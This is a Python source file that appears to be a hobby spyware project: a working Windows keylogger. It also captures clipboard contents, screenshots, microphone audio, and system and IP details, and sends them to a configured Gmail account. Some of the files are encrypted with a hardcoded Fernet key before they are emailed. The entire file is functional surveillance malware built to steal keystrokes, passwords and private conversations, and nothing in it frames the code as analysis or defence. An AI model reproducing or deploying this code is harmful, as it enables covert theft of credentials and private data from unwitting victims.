import socket
import platform
import requests

import win32clipboard

from PIL import ImageGrab

from scipy.io.wavfile import write
import sounddevice as sd

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

from pynput.keyboard import Key, Listener

import threading
import time
from cryptography.fernet import Fernet



email_address = "XXX"     #amend your email address
password = "XXX"   #password to email address
toaddr = "XXX"    #sender address

keylogfile = "keylogfile.txt"
clipboard_info = "clipboard.txt"
system_information = "systeminfo.txt"
screenshot_info = "screenshot_info.jpeg"
audio_information = "audio.wav"

enck = "e_k.txt"    #encrypt keylogfile
encc = "e_c.txt"    #encrypt clipboard_info
encs = "e_s.txt"    #encrypt system_info
key = "mCrPIWf_sr-q8qMyicUfmYe8VGa7oTBecX0EzUM8hls="    #encryption key I generated from gen_key.py

filepath = r"C:\Users\Max\PycharmProjects\New\Project"  #my path for project
extend = "\\"   #extension at end
filemerge = filepath + extend

count = 0   #counting keys
keys = []   #keys list
microphone_time = 10    #microphone duration time



#process, system, machine, IP pub and priv, Ipify headers
def computer_information():
    with open(filepath + extend + system_information, "a") as f:
        IPAddr = socket.gethostbyname(socket.gethostname())
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + " " + '\n')
        f.write("Private IP: " + IPAddr + '\n')
        try:
            public_ip = requests.get("https://api.ipify.org")
            f.write("Public IP: " + public_ip.text + '\n')
        except Exception:
            f.write("Couldn't get public IP address (most likely max query")
        f.write("Ipify headers: " + str(public_ip.headers) + '\n')


#copy contents of clipboard
def copy_clipboard():
    with open(filepath + extend + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard data: \n" + pasted_data)
        except:
            f.write("Clipboard could not be copied")


#screenshot image
def screenshot():
    im = ImageGrab.grab(bbox = None)
    im.save(filepath + extend + screenshot_info)


#microphone recording based on microphone_time & frequency (fs)
def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(filepath + extend + audio_information, fs, myrecording)


#makes MIMEMultipart msg, attach MIMEText, builds MIMEBase and attachment added, encodes, headers
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
# takes mail smtp servers details, starts TLS conn, logs into email, convert msg to text string, sendmail, quits
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()



##BEGINNING OF MAIN PROGRAM CALLING



screenshot_iteration = 3  #iteration for screenshots to be sent
p2 = 0  #shows which screenshots sent per iteration, keep 0
waiting = True  #as functions are threaded, I have added this global variable to stop the keylogger once screenshots are done


#call system info & clipboard info
def program():
    computer_information()
    copy_clipboard()


#call microphone (note microphone_time global var - how long it will run) and send email (unencrypted)
def microphone_function():
    microphone()
    send_email(audio_information, filepath + extend + audio_information, toaddr)
    print(f"sent audio file {microphone_time} seconds")


#call screenshot and send email (unencryped) through iteration. RETURNS waiting global variable.
def screenshots():
    global screenshot_iteration, p2, waiting
    while screenshot_iteration > 0:
        screenshot()
        send_email(screenshot_info, filepath + extend + screenshot_info, toaddr)
        p2 += 1
        print(f"sent screenshot {p2}")
        time.sleep(5)
        screenshot_iteration = screenshot_iteration - 1
    if screenshot_iteration == 0:
        waiting = False
        print("sent all screenshots")
        return waiting


#whilst waiting is true (until screenshots returns waiting false OR esc key is used), Listener uses on_press and detects keys, writes to file through write_file function
def keylogging():
    global waiting
    while waiting:
        def on_press(key):
            global keys, count
            keys.append(key)
            count += 1
            print("{0}".format(key))
            if count >= 1:
                count = 0
                write_file(keys)
                keys = []

        def write_file(keys):
            with open(filepath + extend + keylogfile, "a") as f:
                for key in keys:
                    k = str(key).replace("'", "")
                    if k.find("space") > 0:
                        f.write(" ")
                    if k.find("enter") > 0:
                        f.write(" \n")
                    elif k.find("Key") == -1:
                        f.write(k)

        def on_release(key):
            if key == Key.esc:
                print("exiting keylogger")
                return False
            if waiting == False:
                print("exiting keylogger")
                return False

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()


#threading all functions to start at once and then join, unencrypted emails sent here, encrypted emails sent after.
t1 = threading.Thread(target=program)
t2 = threading.Thread(target=screenshots)
t3 = threading.Thread(target=keylogging)
t4 = threading.Thread(target=microphone_function)
t1.start()
t2.start()
t3.start()
t4.start()
t1.join()
t2.join()
t3.join()
t4.join()

print("UNENCRYPTED screenshots / microphone logs sent")


#once threads finished and screenshots/microphone info sent unencrypted, system/clip/keylog will be encrypted and sent
files_to_encrypt = [filemerge + system_information, filemerge + clipboard_info, filemerge + keylogfile]
encrypted_file_name = [filemerge + encs, filemerge + encc, filemerge + enck]
count = 0

#opens files to encrypt and reads, sets fernetkey as secret key (key already generated on gen_key.py), encrypt data, write this to new encrypted files and send them
for encryption in files_to_encrypt:
    with open(files_to_encrypt[count], "rb") as f:
        data = f.read()

    fernetkey = Fernet(key)
    encrypted = fernetkey.encrypt(data)
    with open(encrypted_file_name[count], "wb") as f:
        f.write(encrypted)

    send_email(encrypted_file_name[count], encrypted_file_name[count], toaddr)
    count += 1
    time.sleep(1)

print("ENCRYPTED keylog/system/clipboard info sent")

#if wanting to decrypt these, use decryptfile.py
